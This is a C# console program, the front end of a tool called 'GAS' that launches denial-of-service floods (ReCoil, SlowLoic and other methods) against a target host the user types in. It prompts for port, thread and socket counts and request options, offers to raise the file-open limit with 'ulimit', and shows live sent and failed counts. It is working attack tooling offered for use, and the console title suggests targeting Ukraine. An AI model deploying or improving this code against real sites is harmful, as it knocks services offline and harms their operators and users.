using System;
using System.Linq;
using System.Timers;
using GAS.Core.AttackInformation;

namespace GAS.TUI {
    public static class Program {
        static DateTime _d;
        static readonly string[] Blacklist = { "epicm.org", "localhost", "127.0.0", "192.168." };
        static readonly Core.Manager Core = new Core.Manager();
        static int _num = 1;
        public static void Main() {
            int tmpIntParse;
            bool tmpBoolParse;
            try { Console.Title = @"[GAS] for urkaine :)"; }
            catch ( Exception ) { }
            #region Detect oS
            string temp;
            if ( Environment.OSVersion.Platform.ToString().ToLower().Contains( "unix" ) )
                if ( Environment.UserName != "root" )
                    Console.Error.WriteLine( "You are using Linux/Mac OS and you are not root.\r\nIf you want to use ReCoil/SlowLoic attack you must run \"ulimit -n<ShreadCount>*<SocketCount>*2+5000\"" );
                else {
                    Console.WriteLine( @"Is file open limit unlocked?
If attack will not give any effect run ""ulimit -n<ShreadCount>*<SocketCount>*2+5000"" as root" );
                    Console.WriteLine( @"Do you want to run ""ulimit -n999999""? [true] (true|false)" );
                    if ( bool.Parse(( temp = Console.ReadLine() ) == "" ? "true" : temp ) ) {
                        try {
                            System.Diagnostics.Process.Start( "ulimit", "-n999999" );
                        }
                        catch {
                            _e( "Failed to run ulimit" );
                        }
                    }
                }
            #endregion
            #region Info
            Console.ForegroundColor = ConsoleColor.Cyan;
            Console.WriteLine( @"###############################################" +
            Environment.NewLine +
            @"# GAS by http://github.com/kasthack #" +
            Environment.NewLine +
            @"###############################################" );
            #endregion
            while ( !GetHost() ) { }
            #region GetParam
            if ( _q( String.Format( "Subsite is {0}, do you want to change it? [n] (y/n)", Core.Subsite ) ).Trim().ToLower() == "y" )
                Core.Subsite = Console.ReadLine();
            while ( !int.TryParse( ( temp = _q( "Enter port[80]:" ) ) == "" ? "80" : temp, out tmpIntParse ) )
                _e( "Bad port" );
            Core.Port = tmpIntParse;
            var mt = typeof( AttackMethod );
            Core.Method = (AttackMethod) Enum.Parse( mt, ( temp = _q( String.Format( "Select attack type [ReCoil]:\r\n({0})", String.Join( "|", Enum.GetNames( mt ) ) ) ) ) == "" ? "ReCoil" : temp );
            while ( !int.TryParse( ( temp = _q( "Enter thread count [50]:" ) ) == "" ? "50" : temp, out tmpIntParse ) )
                Core.Threads = tmpIntParse;
            while ( !int.TryParse( ( temp = _q( "Enter sockets per thread [50]" ) ) == "" ? "50" : temp, out tmpIntParse ) )
                Core.Spt = tmpIntParse;
            while ( !int.TryParse( ( temp = _q( "Enter delay [0]:" ) ) == "" ? "0" : temp, out tmpIntParse ) )
                Core.Delay = tmpIntParse;
            while ( !int.TryParse( ( temp = _q( "Enter timeout[30]:" ) ) == "" ? "30" : temp, out tmpIntParse ) )
                Core.Timeout = tmpIntParse;
            while ( !bool.TryParse( ( temp = _q( "USE Get [true]:" ) ) == "" ? "true" : temp, out tmpBoolParse ) )
                Core.UseGet = tmpBoolParse;
            while ( !bool.TryParse( ( temp = _q( "USE GZIP [true]:" ) ) == "" ? "true" : temp, out tmpBoolParse ) )
                Core.UseGZIP = tmpBoolParse;
            while ( !bool.TryParse( ( temp = _q( "Wait For Response [false]:" ) ) == "" ? "false" : temp, out tmpBoolParse ) )
                Core.WaitForResponse = tmpBoolParse;
            while ( !bool.TryParse( ( temp = _q( "Append RANDOM Chars [true]:" ) ) == "" ? "true" : temp, out tmpBoolParse ) )
                Core.AppendRANDOMChars = tmpBoolParse;
            while ( !bool.TryParse( ( temp = _q( "Append RANDOM Chars 2 Url [true]:" ) ) == "" ? "true" : temp, out tmpBoolParse ) )
                Core.AppendRANDOMCharsUrl = tmpBoolParse;
            Console.WriteLine( @"Starting attack..." );
            #endregion
            #region Start and stop
            Core.Start();
            _d = DateTime.Now;
            Console.Clear();
            var t = new Timer {
                Interval = 500
            };
            t.Elapsed += t_Elapsed;
            t.Start();
            //attack started
            #region Cool UI
            Console.SetCursorPosition( 0, 0 );
            Console.ForegroundColor = ConsoleColor.Yellow;
            Console.WriteLine( @"------------------------------------------------" );
            Console.ForegroundColor = ConsoleColor.Green;
            try {
                Console.SetCursorPosition( 0, 6 );
            }
            catch { }
            Console.ForegroundColor = ConsoleColor.Yellow;
            Console.WriteLine( @"------------------------------------------------" );
            Console.ForegroundColor = ConsoleColor.Green;
            Console.WriteLine( @"Attacking..." );
            Console.ForegroundColor = ConsoleColor.Yellow;
            Console.ForegroundColor = ConsoleColor.Red;
            Console.WriteLine( @"Press Enter stop attack and exit" );
            Console.ForegroundColor = ConsoleColor.Green;
            #endregion
            Console.ReadLine();
            Console.WriteLine( @"



------------------------------------------------
Exiting, please wait..." );
            t.Stop();
            Core.Stop();
            Console.Clear();
            #endregion
        }
        static string _q( string q ) {
            var con_c = Console.ForegroundColor;
            Console.ForegroundColor = ConsoleColor.Yellow;
            string s = "";
            Console.Write( @"{0}. {1}{2}>", _num++, q, Environment.NewLine );
            Console.ForegroundColor = con_c;
            s = Console.ReadLine();
            return s;
        }
        static void _e( string e ) {
            var conC = Console.ForegroundColor;
            Console.ForegroundColor = ConsoleColor.Red;
            Console.WriteLine( e );
            Console.ForegroundColor = conC;
        }
        static bool GetHost() {
            var temp = _q( "Select target [www.example.com]:" );
            temp = ( temp == "" ? "www.example.com" : temp );
            if ( Blacklist.Any(s => temp.ToLower().Contains( s )) ) {
                _e( "[Restricted domain!]" );
                return false;
            }
            var ipok = Core.LockOn( temp );
            if ( !ipok )
                _e( "[Wrong Target!]" );
            return ipok;
        }
        static void t_Elapsed( object sender, ElapsedEventArgs argZ ) {
            var w = Console.WindowWidth;
            var e = new char[ w ];
            int ind;
            for ( var i = 0; i < w; e[ i++ ] = ' ' ) {}
            try {
                Console.SetCursorPosition( 0, 3 );
            }
            catch (Exception) { }
            Console.WriteLine( e );
            Console.WriteLine( e );
            try {
                Console.SetCursorPosition( 0, 3 );
            }
            catch { }
            Console.WriteLine( @"Time elapsed	Sent	Received	Failed" );
            var s = DateTime.Now.Subtract( _d ).ToString();
            s = s.Substring( 0, ( ind = s.LastIndexOfAny( new[] { '.', ',' } ) ) > 0 ? ind : s.Length );
            Console.WriteLine( @"{0}	{1}	{2}		{3}", s, Core.Requested, Core.Downloaded, Core.Failed );
        }
    }
}